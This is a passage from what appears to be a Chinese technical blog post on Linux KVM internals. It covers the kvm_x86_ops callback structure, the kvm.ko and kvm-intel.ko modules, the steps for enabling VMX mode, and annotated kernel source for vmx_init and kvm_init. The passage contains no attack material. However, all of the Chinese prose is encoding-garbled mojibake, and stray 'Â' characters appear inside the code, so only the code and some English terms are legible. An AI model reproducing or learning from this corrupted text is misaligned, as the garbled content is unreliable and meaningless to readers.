ç­‰ï¼Œè¿™äº›æ–‡ä»¶åŒ…å«äº†ä¸€äº›å…³äºç‰ˆæƒã€è®¸å¯è¯ã€è´¡çŒ®è€…ã€é…ç½®å’Œæ–‡æ¡£ç­‰ä¿¡æ¯</li></ol><p>æ¯”è¾ƒé‡è¦çš„ç›®å½•</p><table><thead><tr><th>ç›®å½•</th><th>å…³æ³¨ç‚¹å’Œé‡è¦æ€§</th></tr></thead><tbody><tr><td>arch</td><td>ç¡¬ä»¶æ¶æ„ç›¸å…³çš„ä»£ç ï¼Œä¸åŒçš„ç¡¬ä»¶æ¶æ„æœ‰å„è‡ªçš„å­ç›®å½•ã€‚ç¡¬ä»¶æ¶æ„å’Œåº•å±‚ç¡¬ä»¶çš„ç ”ç©¶ã€å®ç°å’Œä¼˜åŒ–</td></tr><tr><td>kernel</td><td>æ ¸å¿ƒå†…æ ¸ä»£ç ï¼Œè°ƒåº¦å™¨ã€ä¸­æ–­å¤„ç†ã€ç³»ç»Ÿè°ƒç”¨ç­‰ã€‚æ“ä½œç³»ç»Ÿå†…æ ¸åŠŸèƒ½å’Œè®¾è®¡çš„ç ”ç©¶å’Œå®ç°</td></tr><tr><td>drivers</td><td>å„ç§è®¾å¤‡é©±åŠ¨çš„ä»£ç ï¼Œç¡¬ä»¶è®¾å¤‡çš„äº¤äº’ã€ä¼˜åŒ–å’Œæ€§èƒ½ã€‚è®¾å¤‡é©±åŠ¨å’Œç¡¬ä»¶äº¤äº’çš„ç ”ç©¶å’Œå®ç°</td></tr><tr><td>mm</td><td>å†…å­˜ç®¡ç†ç›¸å…³çš„ä»£ç ï¼Œç‰©ç†å†…å­˜ã€è™šæ‹Ÿå†…å­˜çš„ç®¡ç†å’Œä¼˜åŒ–ã€‚å†…å­˜ç®¡ç†ã€å†…å­˜ä¼˜åŒ–å’Œåˆ†é…ç­–ç•¥çš„ç ”ç©¶</td></tr><tr><td>net</td><td>ç½‘ç»œåè®®æ ˆçš„ä»£ç ï¼Œç½‘ç»œæ•°æ®åŒ…çš„æ”¶å‘ã€åè®®å®ç°å’Œç½‘ç»œæ€§èƒ½ä¼˜åŒ–ã€‚ç½‘ç»œåè®®ã€æ€§èƒ½å’Œä¼˜åŒ–çš„ç ”ç©¶</td></tr><tr><td>security</td><td>ç³»ç»Ÿå®‰å…¨æ€§ç›¸å…³çš„ä»£ç ï¼Œè®¿é—®æ§åˆ¶ã€æƒé™ç®¡ç†å’Œå®‰å…¨ç­–ç•¥ã€‚æ“ä½œç³»ç»Ÿå®‰å…¨æ€§å’Œå®‰å…¨ç­–ç•¥çš„ç ”ç©¶å’Œå®ç°</td></tr><tr><td>Documentation</td><td>Linuxå†…æ ¸çš„æ–‡æ¡£ï¼Œå¼€å‘è€…å’Œç”¨æˆ·æŒ‡å—ï¼Œç†è§£å’Œä½¿ç”¨å†…æ ¸çš„é‡è¦èµ„æºã€‚æ–‡æ¡£å¯¹äºå†…æ ¸çš„ç†è§£å’Œä½¿ç”¨éå¸¸é‡è¦ã€‚</td></tr></tbody></table><p>KVMçš„ä¸åŒè™šæ‹ŸåŒ–å®ç°ï¼ˆIntelå’ŒAMDï¼‰éƒ½ä¼š<strong>å‘KVMæ¨¡å—æ³¨å†Œä¸€ä¸ªkvm_x86_opsç»“æ„ä½“</strong>ã€‚KVMä¸­çš„ä¸€äº›å‡½æ•°å¯èƒ½<strong>é¦–å…ˆä¼šè°ƒç”¨kvm_arch_xxxå‡½æ•°</strong>ï¼Œxxxæ˜¯æ¶æ„ç±»å‹ï¼Œæ¯”å¦‚x86ï¼Œåˆ™ä¼šè°ƒç”¨kvm_x86_opsç»“æ„ä¸­çš„ç›¸å…³å›è°ƒå‡½æ•°ã€‚<strong>kvm_x86_ops</strong>æ˜¯ä¸€ä¸ªç»“æ„ä½“ï¼ŒåŒ…å«äº†ä¸€ç»„å‡½æ•°æŒ‡é’ˆï¼Œç”¨äºå¤„ç†åœ¨ x86 æ¶æ„ä¸‹çš„è™šæ‹ŸåŒ–æ“ä½œã€‚è¿™äº›å‡½æ•°æŒ‡é’ˆå®é™…ä¸Šæ˜¯å›è°ƒå‡½æ•°ï¼Œå®ƒä»¬å®ç°äº†ç‰¹å®šçš„è™šæ‹ŸåŒ–åŠŸèƒ½ã€‚</p><ul><li><strong>å›è°ƒå‡½æ•°ï¼š</strong> åœ¨ <code>kvm_x86_ops</code> ç»“æ„ä½“ä¸­çš„æ¯ä¸ªå‡½æ•°æŒ‡é’ˆéƒ½æŒ‡å‘ä¸€ä¸ªå›è°ƒå‡½æ•°ï¼Œè¿™äº›å‡½æ•°æ˜¯å®é™…æ‰§è¡Œè™šæ‹ŸåŒ–æ“ä½œçš„åœ°æ–¹ã€‚</li><li><strong><code>kvm_arch_xxx</code> å‡½æ•°ï¼š</strong> è¿™äº›æ˜¯æ¶æ„ç‰¹å®šçš„å‡½æ•°ï¼Œå…¶åç§°ä¸­çš„ <code>xxx</code> è¡¨ç¤ºå…·ä½“çš„æ¶æ„ç±»å‹ï¼Œæ¯”å¦‚ <code>x86</code>ã€‚è¿™äº›å‡½æ•°åœ¨ KVM æ¨¡å—çš„å®ç°ä¸­å¯èƒ½é¦–å…ˆè¢«è°ƒç”¨ï¼Œç„¶åå†æ ¹æ®å…·ä½“çš„æ¶æ„ç±»å‹è°ƒç”¨ç›¸åº”çš„<code>kvm_x86_ops</code> ä¸­çš„å‡½æ•°ã€‚è¿™æ ·çš„æ¶æ„åˆ†ç¦»ä½¿å¾— KVM èƒ½å¤Ÿæ”¯æŒå¤šç§ä¸åŒçš„ç¡¬ä»¶æ¶æ„ã€‚</li><li><strong><code>kvm_x86_ops</code> ç»“æ„ä½“ï¼š</strong> è¿™æ˜¯ä¸€ä¸ªåŒ…å«ä¸€ç»„å‡½æ•°æŒ‡é’ˆçš„ç»“æ„ä½“ï¼Œç”¨äºåœ¨ x86 æ¶æ„ä¸‹å¤„ç†è™šæ‹ŸåŒ–æ“ä½œã€‚æ¯ä¸ªå‡½æ•°æŒ‡é’ˆæŒ‡å‘ä¸€ä¸ªç‰¹å®šçš„å‡½æ•°ï¼Œå®ç°äº†ç‰¹å®šçš„è™šæ‹ŸåŒ–åŠŸèƒ½ã€‚è¿™äº›å‡½æ•°å®šä¹‰äº† KVM åœ¨ x86 æ¶æ„ä¸‹çš„è¡Œä¸ºå’Œå¤„ç†æ–¹å¼ï¼Œå¯ä»¥æ ¹æ®éœ€è¦è¿›è¡Œæ‰©å±•å’Œå®šåˆ¶ã€‚</li></ul><p>kvm.koå’Œkvm-intel.koæ˜¯ä¸¤ä¸ªå†…æ ¸æ¨¡å—ï¼Œå®ƒä»¬ååŒå·¥ä½œä»¥å®ç°KVMè™šæ‹ŸåŒ–</p><ol><li>kvm.koï¼šè¿™æ˜¯<strong>KVMçš„é€šç”¨ä»£ç ç”Ÿæˆçš„å†…æ ¸æ¨¡å—</strong>ã€‚å®ƒæœ¬èº«åœ¨åˆå§‹åŒ–é˜¶æ®µå¹¶ä¸æ‰§è¡Œå®é™…è™šæ‹ŸåŒ–ä»»åŠ¡ï¼Œåªæ˜¯<strong>å°†é€šç”¨çš„KVMä»£ç åŠ è½½åˆ°å†…å­˜ä¸­ï¼Œä¸ºKVMçš„å…¶ä»–ç»„ä»¶æä¾›æ”¯æŒ</strong>ã€‚å®ƒ<strong>å¯¼å‡ºäº†KVMçš„æ¥å£</strong>ï¼Œè¿™äº›æ¥å£å°†ä¼šæš´éœ²ç»™ç”¨æˆ·ç©ºé—´ï¼Œä¾›ç”¨æˆ·ç¨‹åºè°ƒç”¨ã€‚</li><li>kvm-intel.koï¼šè¿™æ˜¯é’ˆå¯¹Intel CPUæ¶æ„çš„ç‰¹å®šä»£ç ç”Ÿæˆçš„å†…æ ¸æ¨¡å—ã€‚å®ƒ<strong>è´Ÿè´£å®é™…çš„è™šæ‹ŸåŒ–åŠŸèƒ½</strong>ï¼ŒåŒ…æ‹¬<strong>åˆ›å»ºã€ç®¡ç†å’Œè¿è¡Œè™šæ‹Ÿæœº</strong>ã€‚kvm-intel.koä¼šåœ¨KVMåˆå§‹åŒ–å®Œæˆåè´Ÿè´£å¯åŠ¨å’Œå…³é—­è™šæ‹ŸåŒ–ï¼Œä»¥åŠå¤„ç†ä¸Intel CPUæ¶æ„ç›¸å…³çš„è™šæ‹ŸåŒ–ä»»åŠ¡ã€‚</li><li>å½“<strong>ç”¨æˆ·ç¨‹åºè°ƒç”¨KVMæ¥å£</strong>æ¥æ‰§è¡Œè™šæ‹ŸåŒ–ä»»åŠ¡æ—¶ï¼Œ<strong>kvm.koä¸­çš„é€šç”¨ä»£ç å°†ä¼šè°ƒç”¨kvm-intel.ko</strong>ä¸­çš„æ¶æ„ç›¸å…³ä»£ç æ¥<strong>å¤„ç†å®é™…çš„è™šæ‹ŸåŒ–æ“ä½œ</strong>ã€‚è¿™åŒ…æ‹¬åœ¨è™šæ‹Ÿæœºä¸­æ‰§è¡ŒæŒ‡ä»¤ã€ç®¡ç†è™šæ‹Ÿè®¾å¤‡ç­‰ä»»åŠ¡ã€‚</li></ol><p><img src="https://img.gls.show/img/20230813152054.png"></p><h3 id="4-2-2-KVMæ¨¡å—åˆå§‹åŒ–"><a href="#4-2-2-KVMæ¨¡å—åˆå§‹åŒ–" class="headerlink" title="4.2.2 KVMæ¨¡å—åˆå§‹åŒ–"></a>4.2.2 KVMæ¨¡å—åˆå§‹åŒ–</h3><p>KVMæ¨¡å—çš„åˆå§‹åŒ–ä¸»è¦åŒ…æ‹¬åˆå§‹åŒ–CPUä¸æ¶æ„æ— å…³çš„æ•°æ®ä»¥åŠè®¾ç½®ä¸æ¶æ„ç›¸å…³çš„è™šæ‹ŸåŒ–æ”¯æŒ</p><p>VMMåªæœ‰åœ¨CPUå¤„äºä¿æŠ¤æ¨¡å¼å¹¶ä¸”å¼€å¯åˆ†é¡µæ—¶æ‰èƒ½è¿›å…¥VMXæ¨¡å¼</p><p>å¼€å¯VMXæ¨¡å¼éœ€è¦åšçš„äº‹æƒ…</p><ol><li><p><strong>CPUæ”¯æŒæ£€æµ‹ï¼š</strong> é€šè¿‡CPUIDæŒ‡ä»¤çš„ECXå¯„å­˜å™¨çš„ç¬¬5ä½æ¥æ£€æµ‹CPUæ˜¯å¦æ”¯æŒVMXã€‚</p></li><li><p><strong>VMXèƒ½åŠ›æ£€æµ‹ï¼š</strong> é€šè¿‡è¯»å–ç›¸å…³çš„MSRå¯„å­˜å™¨ï¼Œå¦‚IA32_VMX_BASICã€IA32_VMX_PINBASED_CTLSå’ŒIA32_VMX_PROCBASED_CTLSï¼Œæ¥æ£€æµ‹CPUæ‰€æ”¯æŒçš„VMXèƒ½åŠ›ã€‚</p></li><li><p><strong>åˆ†é…VMXONåŒºåŸŸï¼š</strong> åˆ†é…ä¸€æ®µ4KBå¯¹é½çš„å†…å­˜ä½œä¸ºVMXONåŒºåŸŸï¼Œå¤§å°é€šè¿‡è¯»å–IA32_VMX_BASIC MSRå¯„å­˜å™¨ç¡®å®šã€‚</p></li><li><p><strong>VMXONåŒºåŸŸåˆå§‹åŒ–ï¼š</strong> é€šè¿‡MSRå¯„å­˜å™¨åˆå§‹åŒ–VMXONåŒºåŸŸï¼ŒåŒ…æ‹¬è®¾ç½®ç‰ˆæœ¬æ ‡è¯†ç­‰ä¿¡æ¯ã€‚</p></li><li><p><strong>CR0å’ŒCR4å¯„å­˜å™¨è®¾ç½®ï¼š</strong> ç¡®ä¿å½“å‰CPUè¿è¡Œæ¨¡å¼çš„CR0å’ŒCR4å¯„å­˜å™¨æ»¡è¶³è¿›å…¥VMXçš„æ¡ä»¶ï¼Œéœ€è¦æ»¡è¶³çš„è®¾ç½®é€šè¿‡IA32_VMX_CR0_FIXED0å’ŒIA32_VMX_CR0_FIXED1ã€IA32_VMX_CR4_FIXED0å’ŒIA32_VMX_CR4_FIXED1å¯„å­˜å™¨æŠ¥å‘Šã€‚</p></li><li><p><strong>å¼€å¯VMXæ¨¡å¼ï¼š</strong> è®¾ç½®CR4å¯„å­˜å™¨ä¸­çš„CR4.VMXEä½ä¸º1ï¼Œå¼€å¯VMXæ¨¡å¼ã€‚</p></li><li><p><strong>IA32_FEATURE_CONTROLå¯„å­˜å™¨è®¾ç½®ï¼š</strong> ç¡®ä¿IA32_FEATURE_CONTROLå¯„å­˜å™¨çš„é”å®šä½ï¼ˆ0ä½ï¼‰ä¸º1ï¼Œé€šå¸¸ç”±BIOSè¿›è¡Œè®¾ç½®ã€‚</p></li><li><p><strong>æ‰§è¡ŒVMXONæŒ‡ä»¤ï¼š</strong> ä½¿ç”¨VMXONåŒºåŸŸçš„ç‰©ç†åœ°å€ä½œä¸ºæ“ä½œæ•°ï¼Œè°ƒç”¨VMXONæŒ‡ä»¤ä»¥å¼€å¯VMXæ¨¡å¼ã€‚</p></li><li><p><strong>VMXæ¨¡å¼çš„å¯åŠ¨å’Œå…³é—­ï¼š</strong> ä¸€æ—¦è¿›å…¥VMXæ¨¡å¼ï¼Œå¯ä»¥åœ¨VMX rootæ¨¡å¼ï¼ˆCPL=0ï¼‰ä¸‹æ‰§è¡ŒVMXOFFæŒ‡ä»¤æ¥å…³é—­VMXæ¨¡å¼ã€‚</p></li></ol><p>åœ¨VMXï¼ˆVirtual Machine Extensionsï¼‰æ¨¡å¼ä¸‹ï¼ŒVMX rootæ“ä½œæ¨¡å¼æ˜¯æŒ‡å¤„ç†å™¨è¿è¡Œåœ¨ç‰¹æƒçº§åˆ«0ï¼ˆCPL = 0ï¼‰ä¸‹çš„çŠ¶æ€ï¼Œå³å†…æ ¸æ€ã€‚VMXOFFæŒ‡ä»¤ç”¨äºå…³é—­VMXæ¨¡å¼ï¼Œå°†å¤„ç†å™¨ä»VMXæ“ä½œæ¨¡å¼åˆ‡æ¢å›åˆ°éè™šæ‹ŸåŒ–çš„æ“ä½œæ¨¡å¼ã€‚ä¸ºäº†ç¡®è®¤VMXæ¨¡å¼æ˜¯å¦å·²ç»æˆåŠŸå…³é—­ï¼Œå¯ä»¥é€šè¿‡æ£€æŸ¥RFLAGSå¯„å­˜å™¨çš„CFï¼ˆCarry Flagï¼‰å’ŒZFï¼ˆZero Flagï¼‰ä½çš„å€¼ã€‚</p><p>å…·ä½“æ¥è¯´ï¼Œåœ¨æ‰§è¡ŒVMXOFFæŒ‡ä»¤åï¼Œå¦‚æœRFLAGSå¯„å­˜å™¨çš„CFå’ŒZFéƒ½ä¸º0ï¼Œè¿™è¡¨ç¤ºVMXæ¨¡å¼å·²ç»æˆåŠŸå…³é—­ã€‚è¿™ç§æƒ…å†µä¸‹çš„è§£é‡Šå¦‚ä¸‹ï¼š</p><ul><li>CF = 0ï¼šè¡¨ç¤ºVMXOFFæŒ‡ä»¤æˆåŠŸæ‰§è¡Œï¼Œæ²¡æœ‰å‘ç”Ÿé”™è¯¯ã€‚</li><li>ZF = 0ï¼šè¡¨ç¤ºVMXæ¨¡å¼å·²ç»æˆåŠŸé€€å‡ºï¼Œå¤„ç†å™¨ä¸å†å¤„äºè™šæ‹ŸåŒ–æ¨¡å¼ã€‚</li></ul><p><strong>intel-kvm.koçš„æ¨¡å—æ³¨å†Œå‡½æ•°æ˜¯vmx_init</strong>ï¼Œå…¶ä¸»è¦ä»»åŠ¡ä¸º<strong>è°ƒç”¨æ¶æ„æ— å…³å‡½æ•°kvm_initè¿›è¡ŒKVMæ¨¡å—çš„åˆå§‹åŒ–</strong></p><p>vmx_initè°ƒç”¨äº†kvm_init</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kvm_x86_ops</span> <span class="hljs-title">vmx_x86_ops</span> =</span> &#123;<br>.cpu_has_kvm_support = cpu_has_kvm_support,<br>.disabled_by_bios = vmx_disabled_by_bios,<br><br>...<br><br>.vcpu_create = vmx_create_vcpu,<br><br>...<br><br>Â  Â  .run = vmx_vcpu_run,<br><br>Â  Â  .handle_exit = vmx_handle_exit,<br>...<br><br>&#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> __init <span class="hljs-title">vmx_init</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">int</span> r = kvm_init(&amp;vmx_x86_ops, <span class="hljs-keyword">sizeof</span>(struct vcpu_vmx),<br>                     __alignof__(struct vcpu_vmx), THIS_MODULE);<br><span class="hljs-keyword">if</span> (r)<br><span class="hljs-keyword">return</span> r;<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> CONFIG_KEXEC_CORE</span><br>rcu_assign_pointer(crash_vmclear_loaded_vmcss,<br>   crash_vmclear_local_loaded_vmcss);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>è¿™æ®µä»£ç åˆå§‹åŒ–KVMè™šæ‹ŸåŒ–ï¼Œæä¾›äº†VMXè™šæ‹ŸåŒ–å®ç°çš„å›è°ƒå‡½æ•°å’Œç›¸å…³å‚æ•°ï¼Œä¸ºåç»­çš„è™šæ‹ŸåŒ–æ“ä½œåšå¥½äº†å‡†å¤‡ã€‚åœ¨KVMåˆå§‹åŒ–åï¼Œå¯ä»¥ä½¿ç”¨å…¶ä»–APIæ¥åˆ›å»ºè™šæ‹Ÿæœºã€åˆ†é…VCPUã€è®¾ç½®å¯„å­˜å™¨ç­‰ï¼Œä»¥å®ç°è™šæ‹ŸåŒ–åŠŸèƒ½</p><ol><li><code>kvm_init</code>: è¿™æ˜¯ä¸€ä¸ªç”¨äºåˆå§‹åŒ–KVMçš„å‡½æ•°ã€‚å®ƒä¼šæ‰§è¡Œä¸€ç³»åˆ—æ“ä½œæ¥å¯åŠ¨KVMè™šæ‹ŸåŒ–ï¼Œå¹¶è¿”å›ä¸€ä¸ªæ•´æ•°ç»“æœä»¥æŒ‡ç¤ºæ˜¯å¦æˆåŠŸåˆå§‹åŒ–ã€‚</li><li><code>&amp;vmx_x86_ops</code>: è¿™ä¸ªå‚æ•°æ˜¯ä¸€ä¸ªæŒ‡å‘åŒ…å«Intel VT-xè™šæ‹ŸåŒ–å®ç°å›è°ƒå‡½æ•°çš„ç»“æ„ä½“çš„æŒ‡é’ˆï¼ˆ<strong>æ˜¯kvm_x86_opsç±»å‹</strong>ï¼‰ã€‚è¿™ä¸ªç»“æ„ä½“åŒ…å«äº†ä¸€ç³»åˆ—å›è°ƒå‡½æ•°ï¼Œç”¨äºå¤„ç†ä¸åŒçš„è™šæ‹ŸåŒ–æ“ä½œï¼Œå¦‚ç¡¬ä»¶æ£€æµ‹ã€è™šæ‹Ÿæœºåˆ›å»ºã€å¯„å­˜å™¨è®¾ç½®ç­‰ã€‚è¿™äº›å‡½æ•°æ˜¯ç‰¹å®šäºç¡¬ä»¶çš„ï¼Œç”¨äºå®ç°VMXï¼ˆVirtual Machine Extensionsï¼‰è™šæ‹ŸåŒ–æŠ€æœ¯çš„æ”¯æŒã€‚</li><li><code>sizeof(struct vcpu_vmx)</code>: è¿™æ˜¯ç¬¬äºŒä¸ªå‚æ•°ï¼Œè¡¨ç¤ºVMXå®ç°çš„VCPUï¼ˆVirtual CPUï¼‰ç»“æ„ä½“çš„å¤§å°ã€‚VCPUç»“æ„ä½“åŒ…å«äº†ä¸è™šæ‹ŸCPUç›¸å…³çš„ä¿¡æ¯å’ŒçŠ¶æ€ã€‚</li><li><code>__alignof__(struct vcpu_vmx)</code>: è¿™æ˜¯å¯¹VCPUç»“æ„ä½“çš„å¯¹é½è¦æ±‚ã€‚è¿™ä¸ªå‚æ•°é€šå¸¸ç”¨äºç¡®ä¿ç»“æ„ä½“æŒ‰ç…§æ­£ç¡®çš„å­—èŠ‚å¯¹é½æ–¹å¼åˆ†é…å†…å­˜ï¼Œä»¥ä¼˜åŒ–è®¿é—®å’Œæ“ä½œã€‚</li><li><code>THIS_MODULE</code>: è¿™æ˜¯ä¸€ä¸ªè¡¨ç¤ºå½“å‰æ¨¡å—çš„æ ‡è¯†ç¬¦ï¼Œç”¨äºæ ‡è®°KVMæ¨¡å—çš„æ‰€å±ã€‚</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">kvm_init</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *opaque, <span class="hljs-keyword">unsigned</span> vcpu_size, <span class="hljs-keyword">unsigned</span> vcpu_align,</span></span><br><span class="hljs-params"><span class="hljs-function">  struct <span class="hljs-keyword">module</span> *<span class="hljs-keyword">module</span>)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">int</span> r;<br><span class="hljs-keyword">int</span> cpu;<br><br>r = kvm_arch_init(opaque);<br><span class="hljs-keyword">if</span> (r)<br><span class="hljs-keyword">goto</span> out_fail;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * kvm_arch_init makes sure there&#x27;s at most one caller</span><br><span class="hljs-comment"> * for architectures that support multiple implementations,</span><br><span class="hljs-comment"> * like intel and amd on x86.</span><br><span class="hljs-comment"> * kvm_arch_init must be called before kvm_irqfd_init to avoid creating</span><br><span class="hljs-comment"> * conflicts in case kvm is already setup for another implementation.</span><br><span class="hljs-comment"> */</span><br>r = kvm_irqfd_init();<br><span class="hljs-keyword">if</span> (r)<br><span class="hljs-keyword">goto</span> out_irqfd;<br><br><span class="hljs-keyword">if</span> (!zalloc_cpumask_var(&amp;cpus_hardware_enabled, GFP_KERNEL)) &#123;<br>r = -ENOMEM;<br><span class="hljs-keyword">goto</span> out_free_0;<br>&#125;<br><br>r = kvm_arch_hardware_setup();<br><span class="hljs-keyword">if</span> (r &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">goto</span> out_free_0a;<br><br>for_each_online_cpu(cpu) &#123;<br>smp_call_function_single(cpu,<br>kvm_arch_check_processor_compat,<br>&amp;r, <span class="hljs-number">1</span>);<br><span class="hljs-keyword">if</span> (r &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">goto</span> out_free_1;<br>&#125;<br><br>r = register_cpu_notifier(&amp;kvm_cpu_notifier);<br><span class="hljs-keyword">if</span> (r)<br><span class="hljs-keyword">goto</span> out_free_2;<br>register_reboot_notifier(&amp;kvm_reboot_notifier);<br><br><span class="hljs-comment">/* A kmem cache lets us meet the alignment requirements of fx_save. */</span><br><span class="hljs-keyword">if</span> (!vcpu_align)<br>vcpu_align = __alignof__(struct kvm_vcpu);<br>kvm_vcpu_cache = kmem_cache_create(<span class="hljs-string">&quot;kvm_vcpu&quot;</span>, vcpu_size, vcpu_align,<br>   <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">if</span> (!kvm_vcpu_cache) &#123;<br>r = -ENOMEM;<br><span class="hljs-keyword">goto</span> out_free_3;<br>&#125;<br><br>r = kvm_async_pf_init();<br><span class="hljs-keyword">if</span> (r)<br><span class="hljs-keyword">goto</span> out_free;<br><br>kvm_chardev_ops.owner = <span class="hljs-keyword">module</span>;<br>kvm_vm_fops.owner = <span class="hljs-keyword">module</span>;<br>kvm_vcpu_fops.owner = <span class="hljs-keyword">module</span>;<br><br>r = misc_register(&amp;kvm_dev);<br><span class="hljs-keyword">if</span> (r) &#123;<br>pr_err(<span class="hljs-string">&quot;kvm: misc device register failed\n&quot;</span>);<br><span class="hljs-keyword">goto</span> out_unreg;<br>&#125;<br><br>register_syscore_ops(&amp;kvm_syscore_ops);<br><br>kvm_preempt_ops.sched_in = kvm_sched_in;<br>kvm_preempt_ops.sched_out = kvm_sched_out;<br><br>r = kvm_init_debug();<br><span class="hljs-keyword">if</span> (r) &#123;<br>pr_err(<span class="hljs-string">&quot;kvm: create debugfs files failed\n&quot;</span>);<br><span class="hljs-keyword">goto</span> out_undebugfs;<br>&#125;<br><br>r = kvm_vfio_ops_init();<br>WARN_ON(r);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>out_undebugfs:<br>unregister_syscore_ops(&amp;kvm_syscore_ops);<br>misc_deregister(&amp;kvm_dev);<br>out_unreg:<br>kvm_async_pf_deinit();<br>out_free:<br>kmem_cache_destroy(kvm_vcpu_cache);<br>out_free_3:<br>unregister_reboot_notifier(&amp;kvm_reboot_notifier);<br>unregister_cpu_notifier(&amp;kvm_cpu_notifier);<br>out_free_2:<br>out_free_1:<br>kvm_arch_hardware_unsetup();<br>out_free_0a:<br>free_cpumask_var(cpus_hardware_enabled);<br>out_free_0:<br>kvm_irqfd_exit();<br>out_irqfd:<br>kvm_arch_exit();<br>out_fail:<br><span class="hljs-keyword">return</span> r;<br>&#125;<br></code></pre></td></tr></table></figure><p>å‡½æ•°è°ƒç”¨åˆ†æ</p><table><thead><tr><th>å‡½æ•°å</th><th>åŠŸèƒ½æè¿°</th></tr></thead><tbody><tr><td>kvm_arch_init</td><td>åˆå§‹åŒ–æ¶æ„ç›¸å…³çš„ä»£ç ã€‚</td></tr><tr><td>kvm_irqfd_init</td><td>åˆå§‹åŒ–irqfdç›¸å…³çš„æ•°æ®ï¼Œä¸»è¦æ˜¯åˆ›å»ºä¸€ä¸ªçº¿ç¨‹ã€‚</td></tr><tr><td>kvm_arch_hardware_setup</td><td>åˆ›å»ºå¯åŠ¨KVMæ—¶æ‰€éœ€çš„æ•°æ®ç»“æ„ï¼Œåˆå§‹åŒ–ç¡¬ä»¶ç‰¹æ€§ã€‚</td></tr><tr><td>kvm_arch_check_processor_compat</td><td>æ£€æµ‹æ‰€æœ‰CPUçš„ç‰¹æ€§æ˜¯å¦ä¸€è‡´ã€‚</td></tr><tr><td>æ³¨å†Œé€šçŸ¥å¯¹è±¡</td><td>- kvm_cpu_notifierï¼šç”¨äºCPUçš„çƒ­æ’æ‹”æ—¶é€šçŸ¥ã€‚<br>- 